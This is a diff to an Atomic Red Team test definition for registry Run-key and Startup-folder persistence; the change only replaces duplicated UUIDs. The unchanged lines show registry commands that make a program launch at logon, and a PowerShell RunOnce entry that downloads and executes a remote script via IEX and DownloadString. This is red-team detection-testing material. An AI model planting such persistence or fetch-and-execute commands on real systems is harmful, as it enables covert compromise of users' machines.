@@ -4,7 +4,7 @@ display_name: Registry Run Keys / Start Folder
 
 atomic_tests:
 - name: Reg Key Run
-  uuid: 9b362539-9e85-42f2-b946-927eaeeb74ee
+  uuid: 2e92a4ca-556c-40b2-91bd-8d2535cfc311
 
   description: |
     Run Key Persistence
@@ -24,7 +24,7 @@ atomic_tests:
         REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
         REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f
 - name: Reg Key RunOnce
-  uuid: 9b362539-9e85-42f2-b946-927eaeeb74ee
+  uuid: 87649c27-296c-42a9-8795-5bf327e51449
 
   description: |
     RunOnce Key Persistence
@@ -44,7 +44,7 @@ atomic_tests:
         REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
         REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
 - name: PowerShell Registry RunOnce
-  uuid: 9b362539-9e85-42f2-b946-927eaeeb74ee
+  uuid: 2ea9f446-41d7-4d34-9cd6-5c1d0ad2ae60
 
   description: |
     RunOnce Key Persistence via PowerShell
@@ -65,7 +65,7 @@ atomic_tests:
         set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
         Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
 - name: Startup Folder
-  uuid: 9b362539-9e85-42f2-b946-927eaeeb74ee
+  uuid: 7b18a1f6-6215-4c80-bbe2-ef93c6a0c719
 
   description: |
     Add Shortcut To Startup via PowerShell
